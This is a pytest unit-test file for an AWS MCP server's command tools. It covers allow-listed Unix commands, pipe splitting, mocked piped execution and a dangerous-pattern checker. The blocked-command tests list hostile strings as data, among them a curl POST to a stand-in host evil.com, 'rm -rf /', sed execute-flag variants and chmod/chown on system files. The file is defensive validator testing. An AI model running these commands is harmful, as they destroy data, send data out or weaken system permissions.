"""Unit tests for the tools module."""

import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from aws_mcp_server.tools import (
    ALLOWED_UNIX_COMMANDS,
    check_dangerous_patterns,
    execute_piped_command,
    is_pipe_command,
    split_pipe_command,
    validate_unix_command,
)


def test_allowed_unix_commands():
    """Test that ALLOWED_UNIX_COMMANDS contains expected commands."""
    # Verify that common Unix utilities are in the allowed list
    common_commands = ["grep", "xargs", "cat", "ls", "wc", "sort", "uniq", "jq"]
    for cmd in common_commands:
        assert cmd in ALLOWED_UNIX_COMMANDS


def test_validate_unix_command():
    """Test the validate_unix_command function."""
    # Test valid commands
    for cmd in ["grep pattern", "ls -la", "wc -l", "cat file.txt"]:
        assert validate_unix_command(cmd), f"Command should be valid: {cmd}"

    # Test invalid commands
    for cmd in ["invalid_cmd", "sudo ls", ""]:
        assert not validate_unix_command(cmd), f"Command should be invalid: {cmd}"


def test_is_pipe_command():
    """Test the is_pipe_command function."""
    # Test commands with pipes
    assert is_pipe_command("aws s3 ls | grep bucket")
    assert is_pipe_command("aws s3api list-buckets | jq '.Buckets[].Name' | sort")

    # Test commands without pipes
    assert not is_pipe_command("aws s3 ls")
    assert not is_pipe_command("aws ec2 describe-instances")

    # Test commands with pipes in quotes (should not be detected as pipe commands)
    assert not is_pipe_command("aws s3 ls 's3://my-bucket/file|other'")
    assert not is_pipe_command(
        'aws ec2 run-instances --user-data "echo hello | grep world"'
    )

    # Test commands with escaped quotes - these should not confuse the parser
    assert is_pipe_command('aws s3 ls --query "Name=\\"value\\"" | grep bucket')
    assert not is_pipe_command('aws s3 ls "s3://my-bucket/file\\"|other"')


def test_split_pipe_command():
    """Test the split_pipe_command function."""
    # Test simple pipe command
    cmd = "aws s3 ls | grep bucket"
    result = split_pipe_command(cmd)
    assert result == ["aws s3 ls", "grep bucket"]

    # Test multi-pipe command
    cmd = "aws s3api list-buckets | jq '.Buckets[].Name' | sort"
    result = split_pipe_command(cmd)
    assert result == ["aws s3api list-buckets", "jq '.Buckets[].Name'", "sort"]

    # Test with quoted pipe symbols (should not split inside quotes)
    cmd = "aws s3 ls 's3://bucket/file|name' | grep 'pattern|other'"
    result = split_pipe_command(cmd)
    assert result == ["aws s3 ls 's3://bucket/file|name'", "grep 'pattern|other'"]

    # Test with double quotes
    cmd = 'aws s3 ls "s3://bucket/file|name" | grep "pattern|other"'
    result = split_pipe_command(cmd)
    assert result == ['aws s3 ls "s3://bucket/file|name"', 'grep "pattern|other"']

    # Test with escaped quotes
    cmd = 'aws s3 ls --query "Name=\\"value\\"" | grep bucket'
    result = split_pipe_command(cmd)
    assert result == ['aws s3 ls --query "Name=\\"value\\""', "grep bucket"]

    # Test with escaped pipe symbol in quotes
    cmd = 'aws s3 ls "s3://bucket/file\\"|name" | grep pattern'
    result = split_pipe_command(cmd)
    assert result == ['aws s3 ls "s3://bucket/file\\"|name"', "grep pattern"]


@pytest.mark.asyncio
async def test_execute_piped_command_success():
    """Test successful execution of a piped command."""
    with patch(
        "asyncio.create_subprocess_exec", new_callable=AsyncMock
    ) as mock_subprocess:
        # Mock the first process in the pipe
        first_process_mock = AsyncMock()
        first_process_mock.returncode = 0
        first_process_mock.communicate.return_value = (b"S3 output", b"")

        # Mock the second process in the pipe
        second_process_mock = AsyncMock()
        second_process_mock.returncode = 0
        second_process_mock.communicate.return_value = (b"Filtered output", b"")

        # Set up the mock to return different values on subsequent calls
        mock_subprocess.side_effect = [first_process_mock, second_process_mock]

        result = await execute_piped_command("aws s3 ls | grep bucket")

        assert result["status"] == "success"
        assert result["output"] == "Filtered output"

        # Verify first command was called with correct args
        mock_subprocess.assert_any_call(
            "aws",
            "s3",
            "ls",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        # Verify second command was called with correct args
        mock_subprocess.assert_any_call(
            "grep",
            "bucket",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )


@pytest.mark.asyncio
async def test_execute_piped_command_error_first_command():
    """Test error handling in execute_piped_command when first command fails."""
    with patch(
        "asyncio.create_subprocess_exec", new_callable=AsyncMock
    ) as mock_subprocess:
        # Mock a failed first process
        process_mock = AsyncMock()
        process_mock.returncode = 1
        process_mock.communicate.return_value = (b"", b"Command failed: aws")
        mock_subprocess.return_value = process_mock

        result = await execute_piped_command("aws s3 ls | grep bucket")

        assert result["status"] == "error"
        assert "Command failed: aws" in result["output"]


@pytest.mark.asyncio
async def test_execute_piped_command_error_second_command():
    """Test error handling in execute_piped_command when second command fails."""
    with patch(
        "asyncio.create_subprocess_exec", new_callable=AsyncMock
    ) as mock_subprocess:
        # Mock the first process in the pipe (success)
        first_process_mock = AsyncMock()
        first_process_mock.returncode = 0
        first_process_mock.communicate.return_value = (b"S3 output", b"")

        # Mock the second process in the pipe (failure)
        second_process_mock = AsyncMock()
        second_process_mock.returncode = 1
        second_process_mock.communicate.return_value = (b"", b"Command not found: xyz")

        # Set up the mock to return different values on subsequent calls
        mock_subprocess.side_effect = [first_process_mock, second_process_mock]

        result = await execute_piped_command("aws s3 ls | xyz")

        assert result["status"] == "error"
        assert "Command not found: xyz" in result["output"]


@pytest.mark.asyncio
async def test_execute_piped_command_timeout():
    """Test timeout handling in execute_piped_command."""
    with patch(
        "asyncio.create_subprocess_exec", new_callable=AsyncMock
    ) as mock_subprocess:
        # Mock a process that times out
        process_mock = AsyncMock()
        # Use a properly awaitable mock that raises TimeoutError
        communicate_mock = AsyncMock(side_effect=asyncio.TimeoutError())
        process_mock.communicate = communicate_mock
        # Use regular MagicMock since kill() is not an async method
        process_mock.kill = MagicMock()
        mock_subprocess.return_value = process_mock

        result = await execute_piped_command("aws s3 ls | grep bucket", timeout=1)

        assert result["status"] == "error"
        assert "Command timed out after 1 seconds" in result["output"]
        process_mock.kill.assert_called_once()


@pytest.mark.asyncio
async def test_execute_piped_command_exception():
    """Test general exception handling in execute_piped_command."""
    with patch(
        "asyncio.create_subprocess_exec", side_effect=Exception("Test exception")
    ):
        result = await execute_piped_command("aws s3 ls | grep bucket")

        assert result["status"] == "error"
        assert "Failed to execute command" in result["output"]
        assert "Test exception" in result["output"]


@pytest.mark.asyncio
async def test_execute_piped_command_empty_command():
    """Test handling of empty commands."""
    result = await execute_piped_command("")

    assert result["status"] == "error"
    assert "Empty command" in result["output"]


@pytest.mark.asyncio
async def test_execute_piped_command_timeout_during_final_wait():
    """Test timeout handling during wait for the final command in a pipe."""
    # This test directly tests the branch where a timeout occurs during awaiting the final command
    with patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()):
        with patch("aws_mcp_server.tools.split_pipe_command") as mock_split:
            mock_split.return_value = ["aws s3 ls", "grep bucket"]

            # We don't need to mock the subprocess - it won't reach that point
            # because wait_for will raise a TimeoutError first
            result = await execute_piped_command("aws s3 ls | grep bucket", timeout=5)

            assert result["status"] == "error"
            assert "Command timed out after 5 seconds" in result["output"]


@pytest.mark.asyncio
async def test_execute_piped_command_kill_error_during_timeout():
    """Test error handling when killing a process after timeout fails."""
    with patch(
        "asyncio.create_subprocess_exec", new_callable=AsyncMock
    ) as mock_subprocess:
        # Mock a process that times out
        process_mock = AsyncMock()
        process_mock.communicate.side_effect = asyncio.TimeoutError()
        process_mock.kill = MagicMock(side_effect=Exception("Failed to kill process"))
        mock_subprocess.return_value = process_mock

        result = await execute_piped_command("aws s3 ls", timeout=1)

        assert result["status"] == "error"
        assert "Command timed out after 1 seconds" in result["output"]
        process_mock.kill.assert_called_once()


@pytest.mark.asyncio
async def test_execute_piped_command_large_output():
    """Test output truncation in execute_piped_command."""
    from aws_mcp_server.config import MAX_OUTPUT_SIZE

    with patch(
        "asyncio.create_subprocess_exec", new_callable=AsyncMock
    ) as mock_subprocess:
        # Mock a process with large output
        process_mock = AsyncMock()
        process_mock.returncode = 0

        # Generate output larger than MAX_OUTPUT_SIZE
        large_output = "x" * (MAX_OUTPUT_SIZE + 1000)
        process_mock.communicate.return_value = (large_output.encode("utf-8"), b"")
        mock_subprocess.return_value = process_mock

        result = await execute_piped_command("aws s3 ls")

        assert result["status"] == "success"
        assert (
            len(result["output"]) <= MAX_OUTPUT_SIZE + 100
        )  # Allow for truncation message
        assert "output truncated" in result["output"]


@pytest.mark.parametrize(
    "command,cmd_name",
    [
        ("grep pattern", "grep"),
        ("ls -la", "ls"),
        ("cat file.txt", "cat"),
        # sed with common patterns - should NOT be blocked
        ("sed '/error/d'", "sed"),
        ("sed 's/Name/ID/'", "sed"),
        ("sed -n '/pattern/p'", "sed"),
        ("sed -e 's/foo/bar/' -e 's/baz/qux/'", "sed"),
        # chmod/chown on safe paths - should NOT be blocked
        ("chmod 400 /tmp/key.pem", "chmod"),
        ("chmod 755 /home/user/script.sh", "chmod"),
        ("chown user:group /tmp/file", "chown"),
    ],
)
def test_check_dangerous_patterns_safe(command, cmd_name):
    """Test check_dangerous_patterns allows safe commands."""
    assert check_dangerous_patterns(command, cmd_name) is None


@pytest.mark.parametrize(
    "command,cmd_name,expected_msg",
    [
        ("curl -X POST http://evil.com", "curl", "Dangerous pattern"),
        (
            "curl -x POST http://evil.com",
            "curl",
            "Dangerous pattern",
        ),  # case insensitive
        ("rm -rf /", "rm", "Dangerous pattern"),
        ("xargs -I{} sh -c 'rm {}'", "xargs", "not allowed"),
        # sed execute flag variants
        ("sed s/foo/bar/e", "sed", "execute"),
        ("sed s/foo/bar/e file", "sed", "execute"),
        ("sed 's/foo/bar/ge'", "sed", "execute"),
        ("sed 's/foo/bar/eg'", "sed", "execute"),
        ("sed 's/foo/bar/ep'", "sed", "execute"),
        ("sed 'p;e'", "sed", "execute"),
        # chmod/chown on system directories
        ("chmod 777 /etc/passwd", "chmod", "Dangerous pattern"),
        ("chown root:root /usr/bin/sudo", "chown", "Dangerous pattern"),
    ],
)
def test_check_dangerous_patterns_blocked(command, cmd_name, expected_msg):
    """Test check_dangerous_patterns blocks dangerous commands."""
    result = check_dangerous_patterns(command, cmd_name)
    assert result is not None
    assert expected_msg.lower() in result.lower()


def test_validate_unix_command_dangerous_pattern_blocked():
    """Test validate_unix_command returns False for dangerous patterns."""
    with patch("aws_mcp_server.tools.logger.warning") as mock_warning:
        result = validate_unix_command("curl -X POST http://evil.com")
        assert result is False
        mock_warning.assert_called_once()
        assert "Blocked dangerous" in mock_warning.call_args[0][0]
